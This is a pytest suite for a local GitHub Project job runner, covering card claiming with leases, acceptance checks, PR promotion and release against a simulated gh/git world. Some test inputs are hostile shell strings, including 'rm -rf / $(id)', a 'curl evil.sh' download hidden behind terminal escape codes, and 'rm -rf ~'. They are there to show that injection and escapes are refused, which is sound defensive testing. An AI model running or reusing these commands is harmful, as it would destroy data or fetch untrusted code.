"""Tests for scripts/factory_local.py -- the local job runner.

Every gh and git call goes through a fake runner that simulates one Project
board, issue comments, PRs and a checkout; nothing here reaches GitHub or
runs a real git command.
"""
import json
import shlex
import subprocess
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "scripts"))

import factory_local as fl  # noqa: E402

T0 = datetime(2026, 10, 13, 12, 0, 0, tzinfo=timezone.utc)
REPO = "kody-w/rappterbook"


def done(cmd, rc=0, out="", err=""):
    return subprocess.CompletedProcess(cmd, rc, out, err)


class World:
    """A fake GitHub + git + acceptance command."""

    def __init__(self, tmp_path):
        self.tmp = tmp_path
        self.clock = T0
        self.items = {}
        self.authors = {}
        self.comments = {}  # (repo, n) -> list
        self.next_id = 1000
        self.prs = []
        self.edits = []
        self.calls = []
        self.acceptance_calls = []
        self.acceptance_rc = 0
        self.head = "a" * 40
        self.dirty = ""
        self.branch = "main"
        self.branches = set()
        self.pushed = []
        self.remote = {}  # branch -> pushed sha
        self.on_reread = None  # hook run before a comments read
        self.reads = 0
        self.login = "kody-w"
        self.association = "OWNER"
        self.on_accept = None  # hook run when the acceptance command runs
        self.fail_writes = set()  # "item-edit", "PATCH": gh writes that answer HTTP 503
        self.changed = "scripts/thing.py\n"

    def add_card(self, number, title="Fix the thing", status="Ready", acceptance="`python -m pytest -q`",
                 author="kody-w", repo=REPO, platform="Rappterbook", iterations=None, agent=""):
        item = {"id": f"PVTI_{repo.split('/')[1]}_{number}", "title": title,
                "content": {"type": "Issue", "number": number, "title": title,
                            "url": f"https://github.com/{repo}/issues/{number}", "repository": repo},
                "status": status, "platform": platform, "acceptance": acceptance}
        if iterations is not None:
            item["iterations"] = iterations
        if agent:
            item["agent"] = agent
        self.items[(repo, number)] = item
        self.authors[(repo, number)] = author
        self.comments.setdefault((repo, number), [])
        return item

    def add_comment(self, repo, number, body, login="kody-w", association="OWNER", at=None):
        self.next_id += 1
        stamp = fl.iso(at or self.clock)
        c = {"id": self.next_id, "body": body, "user": {"login": login},
             "author_association": association, "created_at": stamp, "updated_at": stamp}
        self.comments.setdefault((repo, number), []).append(c)
        return c

    def comment_by_id(self, cid):
        for lst in self.comments.values():
            for c in lst:
                if c["id"] == cid:
                    return c
        return None

    # -- dispatch --
    def __call__(self, cmd, cwd=None, input_text=None, timeout=None, env=None):
        self.calls.append({"cmd": list(cmd), "cwd": cwd, "input": input_text, "env": env})
        if cmd[0] == "gh":
            return self.gh(cmd, input_text)
        if cmd[0] == "git":
            return self.git(cmd, cwd)
        self.acceptance_calls.append({"argv": list(cmd), "cwd": cwd, "env": env})
        if self.on_accept:
            self.on_accept(self)
        return done(cmd, self.acceptance_rc, "collected 3 items\n3 passed\n", "")

    def gh(self, cmd, stdin):
        a = cmd[1:]
        if a[:2] == ["project", "view"]:
            return done(cmd, out=json.dumps({"id": "PVT_1", "title": "RAPP Factory"}))
        if a[:2] == ["project", "field-list"]:
            opts = lambda names: [{"id": f"opt_{n}", "name": n} for n in names]  # noqa: E731
            return done(cmd, out=json.dumps({"fields": [
                {"id": "F_status", "name": "Status", "type": "ProjectV2SingleSelectField",
                 "options": opts(["Backlog", "Ready", "Building", "QA", "Review", "Blocked", "Done"])},
                {"id": "F_platform", "name": "Platform", "type": "ProjectV2SingleSelectField",
                 "options": opts(["Rappterbook", "Mars Barn"])},
                {"id": "F_agent", "name": "Agent", "type": "ProjectV2Field"},
                {"id": "F_accept", "name": "Acceptance", "type": "ProjectV2Field"},
                {"id": "F_iter", "name": "Iterations", "type": "ProjectV2Field"},
            ]}))
        if a[:2] == ["project", "item-list"]:
            items = list(self.items.values())
            return done(cmd, out=json.dumps({"items": items, "totalCount": len(items)}))
        if a[:2] == ["project", "item-edit"]:
            if "item-edit" in self.fail_writes:
                return done(cmd, 1, err="HTTP 503: Service Unavailable")
            self.edits.append(a)
            item = next(i for i in self.items.values() if i["id"] == a[a.index("--id") + 1])
            field = a[a.index("--field-id") + 1]
            key = {"F_status": "status", "F_agent": "agent", "F_iter": "iterations"}[field]
            if "--clear" in a:
                item.pop(key, None)
            elif "--single-select-option-id" in a:
                item[key] = a[a.index("--single-select-option-id") + 1][4:]
            elif "--text" in a:
                item[key] = a[a.index("--text") + 1]
            else:
                item[key] = float(a[a.index("--number") + 1])
            return done(cmd, out="{}")
        if a[:2] == ["issue", "view"]:
            repo = a[a.index("--repo") + 1]
            return done(cmd, out=json.dumps({"author": {"login": self.authors[(repo, int(a[2]))]},
                                             "state": "OPEN"}))
        if a[0] == "api":
            path = a[1]
            if "--method" not in a:
                repo_n = path.split("/issues/")
                repo, n = repo_n[0][len("repos/"):], int(repo_n[1].split("/")[0])
                self.reads += 1
                if self.on_reread:
                    self.on_reread(self, repo, n)
                return done(cmd, out=json.dumps([list(self.comments.get((repo, n), []))]))
            body = json.loads(stdin)["body"]
            if a[a.index("--method") + 1] == "POST":
                repo, n = path[len("repos/"):].split("/issues/")
                c = self.add_comment(repo, int(n.split("/")[0]), body, login=self.login,
                                     association=self.association)
                return done(cmd, out=json.dumps(c))
            if "PATCH" in self.fail_writes:
                return done(cmd, 1, err="HTTP 503: Service Unavailable")
            c = self.comment_by_id(int(path.rsplit("/", 1)[1]))
            if c is None:
                return done(cmd, 1, err="HTTP 404: Not Found")
            c["body"], c["updated_at"] = body, fl.iso(self.clock)
            return done(cmd, out=json.dumps(c))
        if a[:2] == ["repo", "view"]:
            return done(cmd, out=json.dumps({"defaultBranchRef": {"name": "main"}}))
        if a[:2] == ["repo", "clone"]:
            (Path(a[3]) / ".git" / "info").mkdir(parents=True)
            return done(cmd)
        if a[:2] == ["pr", "list"]:
            head = a[a.index("--head") + 1]
            return done(cmd, out=json.dumps([p for p in self.prs if p["head"] == head]))
        if a[:2] == ["pr", "create"]:
            n = 500 + len(self.prs)
            url = f"https://github.com/{a[a.index('--repo') + 1]}/pull/{n}"
            head = a[a.index("--head") + 1]
            self.prs.append({"number": n, "url": url, "state": "OPEN", "isCrossRepository": False,
                             "headRefName": head, "baseRefName": a[a.index("--base") + 1],
                             "headRefOid": self.remote.get(head), "headRepositoryOwner": {"login": "kody-w"},
                             "head": head, "body": stdin, "title": a[a.index("--title") + 1]})
            return done(cmd, out=url + "\n")
        if a[:2] == ["pr", "edit"]:
            pr = next(p for p in self.prs if p["number"] == int(a[2]))
            pr["body"] = stdin
            return done(cmd)
        raise AssertionError(f"unexpected gh call {cmd}")

    def git(self, cmd, cwd):
        a = cmd[1:]
        if a[:2] == ["remote", "get-url"]:
            return done(cmd, out=f"https://github.com/{REPO}.git\n")
        if a[0] == "fetch":
            return done(cmd)
        if a[:2] == ["rev-parse", "--abbrev-ref"]:
            return done(cmd, out=self.branch + "\n")
        if a[:2] == ["rev-parse", "--verify"]:
            return done(cmd, 0 if a[3][len("refs/heads/"):] in self.branches else 1)
        if a[:2] == ["rev-parse", "--git-path"]:
            return done(cmd, out=".git/info/exclude\n")
        if a == ["rev-parse", "HEAD"]:
            return done(cmd, out=self.head + "\n")
        if a[0] == "status":
            return done(cmd, out=self.dirty)
        if a[0] == "checkout":
            self.branch = a[-2] if "-b" in a else a[-1]
            self.branches.add(self.branch)
            return done(cmd)
        if a[:2] == ["rev-list", "--count"]:
            return done(cmd, out="2\n")
        if a[0] == "push":
            self.pushed.append(a)
            ref = a[-1].split(":refs/heads/", 1)[1]
            self.remote[ref] = self.head
            for pr in self.prs:
                if pr["head"] == ref and pr.get("isCrossRepository") is False:
                    pr["headRefOid"] = self.head
            return done(cmd)
        if a[:2] == ["diff", "--name-only"]:
            return done(cmd, out=self.changed)
        raise AssertionError(f"unexpected git call {cmd}")


@pytest.fixture
def world(tmp_path, monkeypatch):
    monkeypatch.setenv("FACTORY_LOCAL_HOME", str(tmp_path / "home"))
    monkeypatch.delenv("FACTORY_CARD_AUTHORS", raising=False)
    monkeypatch.delenv("FACTORY_PROJECT", raising=False)
    monkeypatch.delenv("FACTORY_LOCAL_REPOS", raising=False)
    monkeypatch.delenv("FACTORY_AGENT", raising=False)
    monkeypatch.chdir(tmp_path)
    return World(tmp_path)


def run(world, *argv):
    return fl.main(list(argv), runner=world, now=lambda: world.clock)


def workdir(world):
    return world.tmp / "home" / "rappterbook"


def pull(world, number=7, agent="zion-coder-01", machine="laptop", *extra):
    return run(world, "pull", "--card", f"rappterbook#{number}", "--agent", agent,
               "--machine", machine, *extra)


def claim_markers(world, number=7):
    return [c for c in world.comments[(REPO, number)] if "factory-lease" in c["body"]]


def gh_writes(world):
    return [c["cmd"] for c in world.calls if c["cmd"][0] == "gh" and (
        c["cmd"][1:3] in (["project", "item-edit"], ["pr", "create"], ["pr", "edit"])
        or "--method" in c["cmd"])]


# ── list ─────────────────────────────────────────────────────────────────────

def test_list_shows_ready_cards_and_filters(world, capsys):
    world.add_card(7, "Fix the thing")
    world.add_card(8, "Not ready", status="Backlog")
    world.add_card(3, "Barn card", repo="kody-w/mars-barn", platform="Mars Barn")
    world.items[("kody-w/other", 1)] = dict(world.add_card(1, repo="kody-w/other"))
    assert run(world, "list") == 0
    out = capsys.readouterr().out
    assert "kody-w/rappterbook#7" in out and "kody-w/mars-barn#3" in out
    assert "#8" not in out and "kody-w/other" not in out
    assert run(world, "list", "--platform", "mars barn", "--json") == 0
    cards = json.loads(capsys.readouterr().out)
    assert [(c["repo"], c["number"]) for c in cards] == [("kody-w/mars-barn", 3)]
    assert run(world, "list", "--repo", "rappterbook") == 0
    assert "mars-barn" not in capsys.readouterr().out
    assert gh_writes(world) == []


# ── pull ─────────────────────────────────────────────────────────────────────

def test_pull_claims_sets_board_and_writes_card(world):
    world.add_card(7, "Fix the thing; rm -rf / $(id)")
    assert pull(world) == 0
    markers = claim_markers(world)
    assert len(markers) == 1
    lease = json.loads(fl.LEASE_RE.search(markers[0]["body"]).group(1))
    assert lease["agent"] == "zion-coder-01" and lease["machine"] == "laptop"
    assert lease["expires"] == fl.iso(T0 + timedelta(hours=4))
    item = world.items[(REPO, 7)]
    assert item["status"] == "Building" and item["agent"] == "zion-coder-01"
    branch = "worker-auto-pr-factory-rappterbook-7-fix-the-thing-rm-rf-id"
    assert world.branch == branch
    card = json.loads((workdir(world) / ".factory" / "card.json").read_text())
    assert card["number"] == 7 and card["repo"] == REPO and card["branch"] == branch
    assert card["acceptance"] == "`python -m pytest -q`"
    assert card["lease_expires"] == lease["expires"]
    exclude = (workdir(world) / ".git" / "info" / "exclude").read_text()
    assert "/.factory/" in exclude.splitlines()
    # Pulling again (same agent, unexpired) renews in place and does not duplicate the exclude.
    world.clock = T0 + timedelta(hours=1)
    assert pull(world) == 0
    assert len(claim_markers(world)) == 1
    assert fl.iso(T0 + timedelta(hours=5)) in claim_markers(world)[0]["body"]
    assert (workdir(world) / ".git" / "info" / "exclude").read_text().count("/.factory/") == 1


def test_pull_refuses_untrusted_author(world, capsys):
    world.add_card(7, author="stranger")
    assert pull(world) == 1
    assert "trusted author" in capsys.readouterr().err
    assert gh_writes(world) == [] and claim_markers(world) == []


def test_factory_card_authors_extends_trust(world, monkeypatch):
    world.add_card(7, author="Helper")
    monkeypatch.setenv("FACTORY_CARD_AUTHORS", "someone, helper")
    assert pull(world) == 0


def test_pull_refuses_when_another_unexpired_claim_exists(world, capsys):
    world.add_card(7)
    world.add_comment(REPO, 7, fl.lease_body("other-agent", "desk", T0 + timedelta(hours=2), "n"))
    assert pull(world) == 1
    assert "claimed by `other-agent`" in capsys.readouterr().err
    assert len(claim_markers(world)) == 1 and world.edits == []


def test_stranger_claim_does_not_block(world):
    world.add_card(7)
    world.add_comment(REPO, 7, fl.lease_body("squatter", "x", T0 + timedelta(hours=2), "n"),
                      login="rando", association="NONE")
    assert pull(world) == 0


def test_claim_race_loser_backs_off(world, capsys):
    world.add_card(7)

    def race(w, repo, n):
        if w.reads == 2:  # the re-read after our write: a rival posted just before us
            ours = w.comments[(repo, n)][-1]
            rival = {"id": ours["id"] - 500, "user": {"login": "kody-w"}, "author_association": "OWNER",
                     "body": fl.lease_body("rival", "tower", T0 + timedelta(hours=4), "r"),
                     "created_at": fl.iso(T0 - timedelta(seconds=1)),
                     "updated_at": fl.iso(T0 - timedelta(seconds=1))}
            w.comments[(repo, n)].insert(0, rival)

    world.on_reread = race
    assert pull(world) == 1
    assert "claimed first by `rival` on `tower`" in capsys.readouterr().err
    ours = world.comments[(REPO, 7)][-1]
    assert ours["body"].startswith("released:") and "factory-lease" not in ours["body"]
    assert world.edits == []  # board untouched
    assert not (workdir(world) / ".factory" / "card.json").exists()


def test_untrusted_claimer_releases_own_claim(world, capsys):
    world.add_card(7)
    world.login, world.association = "visitor", "CONTRIBUTOR"
    assert pull(world) == 1
    assert "cannot claim" in capsys.readouterr().err
    assert claim_markers(world) == []


def test_expired_lease_lets_another_machine_take_over(world):
    world.add_card(7, status="Building", agent="old-agent")
    world.add_comment(REPO, 7, fl.lease_body("old-agent", "desk", T0 - timedelta(minutes=1), "n"),
                      at=T0 - timedelta(hours=5))
    assert pull(world) == 0
    markers = claim_markers(world)
    assert len(markers) == 2 and "zion-coder-01" in markers[-1]["body"]
    assert world.items[(REPO, 7)]["agent"] == "zion-coder-01"


def test_overlong_lease_is_capped(world):
    world.add_card(7)
    world.add_comment(REPO, 7, fl.lease_body("hog", "desk", T0 + timedelta(days=365), "n"),
                      at=T0 - timedelta(hours=25))
    assert pull(world) == 0


def test_same_agent_expired_lease_renews_with_a_fresh_claim(world):
    world.add_card(7, status="Building")
    old = world.add_comment(REPO, 7, fl.lease_body("zion-coder-01", "laptop", T0 - timedelta(minutes=5), "n"),
                            at=T0 - timedelta(hours=4, minutes=5))
    assert pull(world) == 0
    markers = claim_markers(world)
    assert markers[-1]["id"] != old["id"]
    assert fl.iso(T0 + timedelta(hours=4)) in markers[-1]["body"]


def test_building_card_without_lease_is_not_taken(world, capsys):
    world.add_card(7, status="Building")
    assert pull(world) == 1
    assert "no lease" in capsys.readouterr().err


def test_pull_next_skips_untrusted_and_claimed(world):
    world.add_card(1, author="stranger")
    world.add_card(2)
    world.add_comment(REPO, 2, fl.lease_body("other", "desk", T0 + timedelta(hours=1), "n"))
    world.add_card(3)
    assert run(world, "pull", "--next", "--agent", "a1", "--machine", "m") == 0
    assert world.items[(REPO, 3)]["status"] == "Building"
    assert world.items[(REPO, 1)]["status"] == "Ready"


def test_pull_dry_run_writes_nothing(world):
    world.add_card(7)
    assert pull(world, 7, "zion-coder-01", "laptop", "--dry-run") == 0
    assert claim_markers(world) == [] and world.edits == []


def test_pull_requires_agent(world, capsys):
    world.add_card(7)
    assert run(world, "pull", "--card", "rappterbook#7") == 1
    assert "--agent" in capsys.readouterr().err


# ── check ────────────────────────────────────────────────────────────────────

def test_check_requires_confirmation(world, capsys, monkeypatch):
    world.add_card(7)
    assert pull(world) == 0
    monkeypatch.setattr(sys.stdin, "isatty", lambda: False, raising=False)
    assert run(world, "check", "--workdir", str(workdir(world))) == 1
    assert "--yes" in capsys.readouterr().err
    assert world.acceptance_calls == []


def test_check_records_result(world, monkeypatch):
    world.add_card(7)
    assert pull(world) == 0
    monkeypatch.setenv("GH_TOKEN", "secret")
    assert run(world, "check", "--workdir", str(workdir(world)), "--yes") == 0
    call = world.acceptance_calls[0]
    assert call["argv"] == ["python", "-m", "pytest", "-q"]
    assert call["cwd"] == str(workdir(world)) and "GH_TOKEN" not in call["env"]
    result = json.loads((workdir(world) / ".factory" / "last_check.json").read_text())
    assert result["passed"] is True and result["exit_code"] == 0 and result["head"] == world.head
    assert result["tail"][-1] == "3 passed" and isinstance(result["duration_s"], float)


def test_check_refuses_untrusted_author(world):
    world.add_card(7)
    assert pull(world) == 0
    world.authors[(REPO, 7)] = "stranger"
    assert run(world, "check", "--workdir", str(workdir(world)), "--yes") == 1
    assert world.acceptance_calls == []


def test_shell_metacharacters_never_reach_a_shell(world, capsys, monkeypatch):
    nasty = "pytest -q; touch /tmp/pwned && echo $(id) | sh `whoami` > x"
    world.add_card(7, acceptance=nasty)
    assert pull(world) == 0
    capsys.readouterr()
    assert run(world, "check", "--workdir", str(workdir(world)), "--yes") == 0
    argv = world.acceptance_calls[0]["argv"]
    # The backtick span is taken as the command; everything else would be literal argv.
    assert argv == ["whoami"]
    world.items[(REPO, 7)]["acceptance"] = nasty.replace("`", "")
    (workdir(world) / ".factory" / "card.json").unlink()
    assert pull(world) == 0
    capsys.readouterr()
    assert run(world, "check", "--workdir", str(workdir(world)), "--yes") == 0
    argv = world.acceptance_calls[1]["argv"]
    assert argv == shlex.split(nasty.replace("`", ""))
    assert argv[:2] == ["pytest", "-q;"] and "$(id)" in argv and "|" in argv and "&&" in argv
    assert not any(c["cmd"][:1] in (["sh"], ["bash"], ["/bin/sh"]) for c in world.calls)
    shown = capsys.readouterr().out
    assert shlex.join(argv) in shown
    # The runner itself never asks for a shell.
    seen = {}

    def fake_run(cmd, **kwargs):
        seen["cmd"], seen["kwargs"] = cmd, kwargs
        return subprocess.CompletedProcess(cmd, 0, "", "")

    monkeypatch.setattr(fl.subprocess, "run", fake_run)
    fl.default_runner(argv, cwd=str(world.tmp))
    assert seen["cmd"] == argv and not seen["kwargs"].get("shell")


def test_acceptance_argv_rejects_multiline_and_bad_quotes():
    assert fl.acceptance_argv("") is None
    assert fl.acceptance_argv("echo 'unterminated") is None
    assert fl.acceptance_argv("make test\nrm -rf /") is None
    assert fl.acceptance_argv("Run `make test` and see it pass") == ["make", "test"]


# ── promote ──────────────────────────────────────────────────────────────────

def pulled_and_checked(world):
    world.add_card(7, acceptance="`python -m pytest -q` (see #99)")
    assert pull(world) == 0
    assert run(world, "check", "--workdir", str(workdir(world)), "--yes") == 0


def test_promote_refuses_without_check(world, capsys):
    world.add_card(7)
    assert pull(world) == 0
    assert run(world, "promote", "--workdir", str(workdir(world))) == 1
    assert "no passing check" in capsys.readouterr().err
    assert world.pushed == [] and world.prs == []


def test_promote_refuses_failed_check(world, capsys):
    world.add_card(7)
    assert pull(world) == 0
    world.acceptance_rc = 1
    assert run(world, "check", "--workdir", str(workdir(world)), "--yes") == 1
    assert run(world, "promote", "--workdir", str(workdir(world))) == 1
    assert world.pushed == []


def test_promote_refuses_check_for_old_head(world, capsys):
    pulled_and_checked(world)
    world.head = "b" * 40
    assert run(world, "promote", "--workdir", str(workdir(world))) == 1
    assert "run `check` again" in capsys.readouterr().err
    assert world.pushed == [] and world.prs == []


def test_promote_refuses_dirty_check(world):
    world.add_card(7)
    assert pull(world) == 0
    world.dirty = " M file.py\n"
    assert run(world, "check", "--workdir", str(workdir(world)), "--yes") == 0
    world.dirty = ""
    assert run(world, "promote", "--workdir", str(workdir(world))) == 1
    assert world.pushed == []


def test_promote_opens_pr_with_body_and_releases(world):
    pulled_and_checked(world)
    assert run(world, "promote", "--workdir", str(workdir(world))) == 0
    branch = "worker-auto-pr-factory-rappterbook-7-fix-the-thing"
    assert world.pushed == [["push", "origin", f"HEAD:refs/heads/{branch}"]]
    pr = world.prs[0]
    body = pr["body"]
    assert body.startswith(fl.LOCAL_MARKER)
    assert "\nAgent: zion-coder-01\n" in body
    assert body.rstrip().endswith("Closes #7")
    assert body.count("Closes #") == 1 and "#99" not in body and "#\u200b99" not in body
    assert "python -m pytest -q" in body
    assert "result: pass (exit 0)" in body and f"commit: {world.head}" in body
    assert world.items[(REPO, 7)]["status"] == "QA"
    assert "iterations" not in world.items[(REPO, 7)]  # first promotion: no increment
    claim = world.comments[(REPO, 7)][0]
    assert claim["body"].startswith("released:") and "factory-lease" not in claim["body"]
    card = json.loads((workdir(world) / ".factory" / "card.json").read_text())
    assert card["promoted_sha"] == world.head and card["lease_expires"] is None


def test_promote_body_neutralizes_closing_refs_in_acceptance():
    card = {"number": 7, "acceptance": "", "machine": "m"}
    check = {"command": ["echo", "Closes", "#3", "https://github.com/o/r/issues/4", "@team"],
             "passed": True, "exit_code": 0, "duration_s": 1.0, "head": "c" * 40, "ran_at": "t"}
    body = fl.build_pr_body(card, "agent-1", check)
    import re
    assert re.findall(r"(?i)closes\s+#(\d+)", body) == ["7"]
    assert "github.com/o/r/issues/4" not in body and "@team" not in body


def test_promote_again_updates_pr_and_increments_iterations(world):
    pulled_and_checked(world)
    assert run(world, "promote", "--workdir", str(workdir(world))) == 0
    # Same HEAD again: idempotent, no increment, PR updated not duplicated.
    assert run(world, "promote", "--workdir", str(workdir(world))) == 0
    assert len(world.prs) == 1 and "iterations" not in world.items[(REPO, 7)]
    # Reviewer sent it back; a new commit, a new check, a second promotion.
    world.items[(REPO, 7)]["iterations"] = 1
    world.head = "d" * 40
    assert run(world, "check", "--workdir", str(workdir(world)), "--yes") == 0
    assert run(world, "promote", "--workdir", str(workdir(world))) == 0
    assert len(world.prs) == 1 and world.items[(REPO, 7)]["iterations"] == 2.0
    assert f"commit: {'d' * 40}" in world.prs[0]["body"]


def test_promote_refuses_when_someone_else_holds_the_card(world, capsys):
    pulled_and_checked(world)
    world.clock = T0 + timedelta(hours=5)
    world.add_comment(REPO, 7, fl.lease_body("other", "desk", world.clock + timedelta(hours=4), "n"))
    assert run(world, "promote", "--workdir", str(workdir(world))) == 1
    assert "holds the card" in capsys.readouterr().err and world.pushed == []


def test_promote_dry_run_writes_nothing(world):
    pulled_and_checked(world)
    before = len(gh_writes(world))
    assert run(world, "promote", "--workdir", str(workdir(world)), "--dry-run") == 0
    assert len(gh_writes(world)) == before and world.pushed == [] and world.prs == []


# ── release and status ───────────────────────────────────────────────────────

def test_release_returns_card_to_ready(world):
    world.add_card(7)
    assert pull(world) == 0
    assert run(world, "release", "--workdir", str(workdir(world)), "--reason", "blocked on @x #3") == 0
    item = world.items[(REPO, 7)]
    assert item["status"] == "Ready" and "agent" not in item
    claim = world.comments[(REPO, 7)][0]
    assert claim["body"].startswith("released:") and "factory-lease" not in claim["body"]
    assert "@x" not in claim["body"]
    assert not (workdir(world) / ".factory" / "card.json").exists()
    # The card can be pulled again right away.
    assert pull(world, 7, "another", "box") == 0


def test_status_shows_lease_and_check(world, capsys):
    world.add_card(7)
    assert pull(world) == 0
    world.clock = T0 + timedelta(hours=1, minutes=30)
    capsys.readouterr()
    assert run(world, "status", "--workdir", str(workdir(world))) == 0
    out = capsys.readouterr().out
    assert "kody-w/rappterbook#7" in out and "2h 30m left" in out and "none yet" in out
    assert run(world, "check", "--workdir", str(workdir(world)), "--yes") == 0
    world.head = "e" * 40
    capsys.readouterr()
    assert run(world, "status") == 0  # finds the only checkout under the factory home
    assert "HEAD has moved" in capsys.readouterr().out


def test_gh_dns_failure_suggests_godebug(world, capsys):
    def broken(cmd, **kw):
        return done(cmd, 1, err="dial tcp: lookup api.github.com: no such host")

    assert fl.main(["list"], runner=broken, now=lambda: T0) == 1
    assert "GODEBUG=netdns=go" in capsys.readouterr().err


# ── review fixes ─────────────────────────────────────────────────────────────

def fork_pr(world, branch="worker-auto-pr-factory-rappterbook-7-fix-the-thing", state="OPEN", number=99):
    pr = {"number": number, "url": f"https://github.com/{REPO}/pull/{number}", "state": state,
          "isCrossRepository": True, "headRefName": branch, "baseRefName": "main",
          "headRefOid": "f" * 40, "headRepositoryOwner": {"login": "attacker"},
          "head": branch, "body": "fork body", "title": "fork"}
    world.prs.append(pr)
    return pr


def test_promote_ignores_fork_pr_with_same_branch_name(world):
    pulled_and_checked(world)
    fork = fork_pr(world)
    closed = fork_pr(world, state="CLOSED", number=98)
    assert run(world, "promote", "--workdir", str(workdir(world))) == 0
    assert fork["body"] == "fork body" and closed["body"] == "fork body"
    ours = [p for p in world.prs if p.get("isCrossRepository") is False]
    assert len(ours) == 1 and "Closes #7" in ours[0]["body"]
    assert "iterations" not in world.items[(REPO, 7)]  # a fork PR is not a promotion
    card = json.loads((workdir(world) / ".factory" / "card.json").read_text())
    assert card["pr_url"] == ours[0]["url"]
    assert not any(c["cmd"][1:3] == ["pr", "edit"] for c in world.calls)


def test_promote_refuses_to_edit_pr_whose_head_is_not_ours(world, monkeypatch):
    monkeypatch.setattr(fl, "SETTLE_DELAY", 0)
    pulled_and_checked(world)
    assert run(world, "promote", "--workdir", str(workdir(world))) == 0
    world.head = "d" * 40
    assert run(world, "check", "--workdir", str(workdir(world)), "--yes") == 0
    world.prs[0]["isCrossRepository"] = False

    original = world.git

    def stale_push(cmd, cwd):  # the push lands, but the PR keeps reporting the old head
        if cmd[1] == "push":
            world.pushed.append(cmd[1:])
            return done(cmd)
        return original(cmd, cwd)

    world.git = stale_push
    body = world.prs[0]["body"]
    assert run(world, "promote", "--workdir", str(workdir(world))) == 1
    assert world.prs[0]["body"] == body


def test_pull_next_with_non_git_workdir_claims_nothing(world, capsys):
    for n in (7, 8, 9):
        world.add_card(n)
    workdir(world).mkdir(parents=True)
    (workdir(world) / "stray.txt").write_text("x")
    assert run(world, "pull", "--next", "--agent", "a1", "--machine", "m") == 1
    assert "not a git checkout" in capsys.readouterr().err
    assert gh_writes(world) == []
    assert all(world.items[(REPO, n)]["status"] == "Ready" for n in (7, 8, 9))


def test_pull_next_with_dirty_checkout_claims_nothing(world):
    for n in (1, 2, 3):
        world.add_card(n)
    (workdir(world) / ".git" / "info").mkdir(parents=True)
    world.dirty = " M other.py\n"
    assert run(world, "pull", "--next", "--agent", "a1", "--machine", "m") == 1
    assert gh_writes(world) == [] and all(claim_markers(world, n) == [] for n in (1, 2, 3))


def test_pull_next_checkout_failure_after_lease_claims_at_most_one(world, capsys):
    for n in (7, 8, 9):
        world.add_card(n)
    original = world.git

    def failing_fetch(cmd, cwd):
        if cmd[1] == "fetch":
            return done(cmd, 1, err="fatal: unable to access")
        return original(cmd, cwd)

    world.git = failing_fetch
    assert run(world, "pull", "--next", "--agent", "a1", "--machine", "m") == 1
    assert "claim was released" in capsys.readouterr().err
    posted = [c for n in (7, 8, 9) for c in world.comments[(REPO, n)]]
    assert len(posted) == 1 and posted[0]["body"].startswith("released:")
    assert world.edits == []
    assert all(world.items[(REPO, n)]["status"] == "Ready" for n in (7, 8, 9))


def test_acceptance_with_terminal_escapes_is_refused(world, capsys):
    esc = "python -m pytest -q \x1b[8m; curl evil.sh -o x\x1b[0m"
    assert fl.acceptance_argv(esc) is None
    assert fl.acceptance_argv("rm -rf ~ \x1b[2K\x1b[Gpytest -q") is None
    assert fl.acceptance_argv("pytest‮ -q") is None
    assert fl.acceptance_argv("pytest\t-q") == ["pytest", "-q"]
    world.add_card(7, acceptance=esc)
    card = fl.parse_item(world.items[(REPO, 7)], [REPO])
    assert "\x1b" not in card["acceptance"] and fl.REPLACEMENT in card["acceptance"]
    assert pull(world) == 0
    capsys.readouterr()
    assert run(world, "check", "--workdir", str(workdir(world)), "--yes") == 1
    captured = capsys.readouterr()
    assert "no runnable Acceptance" in captured.err and "\x1b" not in captured.out + captured.err
    assert world.acceptance_calls == []


def test_acceptance_with_several_backtick_spans_is_refused():
    assert fl.acceptance_argv("run `tests` then `python -m pytest`") is None
    assert fl.acceptance_argv("run `pytest -q") is None
    assert fl.acceptance_argv("run `pytest -q` please") == ["pytest", "-q"]


def test_release_after_promote_is_refused(world, capsys):
    pulled_and_checked(world)
    assert run(world, "promote", "--workdir", str(workdir(world))) == 0
    edits = len(world.edits)
    assert run(world, "release", "--workdir", str(workdir(world))) == 1
    assert "promoted" in capsys.readouterr().err
    assert world.items[(REPO, 7)]["status"] == "QA" and len(world.edits) == edits
    assert (workdir(world) / ".factory" / "card.json").exists()


def test_release_leaves_board_alone_when_card_left_building(world, capsys):
    world.add_card(7)
    assert pull(world) == 0
    world.items[(REPO, 7)]["status"] = "Review"
    assert run(world, "release", "--workdir", str(workdir(world))) == 0
    assert world.items[(REPO, 7)]["status"] == "Review"
    assert world.comments[(REPO, 7)][0]["body"].startswith("released:")


def test_release_write_failure_keeps_local_state(world, capsys):
    world.add_card(7)
    assert pull(world) == 0
    world.fail_writes = {"item-edit", "PATCH"}
    assert run(world, "release", "--workdir", str(workdir(world))) == 1
    assert "Not released" in capsys.readouterr().err
    assert (workdir(world) / ".factory" / "card.json").exists()
    assert world.items[(REPO, 7)]["status"] == "Building"
    world.fail_writes = set()
    assert run(world, "release", "--workdir", str(workdir(world))) == 0
    assert world.items[(REPO, 7)]["status"] == "Ready"
    assert not (workdir(world) / ".factory" / "card.json").exists()


def test_pull_refuses_second_card_into_held_workdir(world, capsys):
    world.add_card(7)
    world.add_card(8, "Other thing")
    assert pull(world) == 0
    assert run(world, "check", "--workdir", str(workdir(world)), "--yes") == 0
    capsys.readouterr()
    assert pull(world, 8) == 1
    assert "holds kody-w/rappterbook#7" in capsys.readouterr().err
    card = json.loads((workdir(world) / ".factory" / "card.json").read_text())
    assert card["number"] == 7 and claim_markers(world, 8) == []
    assert world.items[(REPO, 8)]["status"] == "Ready"
    # Into another directory it works, and a promoted card does not block its workdir.
    assert pull(world, 8, "zion-coder-01", "laptop", "--workdir", str(world.tmp / "other")) == 0


def test_switching_cards_drops_the_old_check(world):
    pulled_and_checked(world)
    assert run(world, "promote", "--workdir", str(workdir(world))) == 0
    world.add_card(8, "Other thing")
    assert pull(world, 8) == 0
    assert not (workdir(world) / ".factory" / "last_check.json").exists()


def test_iterations_idempotent_across_repull_at_same_head(world):
    pulled_and_checked(world)
    assert run(world, "promote", "--workdir", str(workdir(world))) == 0
    # The card comes back to Ready, local state is lost, it is pulled and promoted again unchanged.
    world.items[(REPO, 7)]["status"] = "Ready"
    (workdir(world) / ".factory" / "card.json").unlink()
    world.clock = T0 + timedelta(hours=1)
    assert pull(world) == 0
    assert run(world, "check", "--workdir", str(workdir(world)), "--yes") == 0
    assert run(world, "promote", "--workdir", str(workdir(world))) == 0
    assert "iterations" not in world.items[(REPO, 7)] and len(world.prs) == 1
    # New work after a re-pull does count.
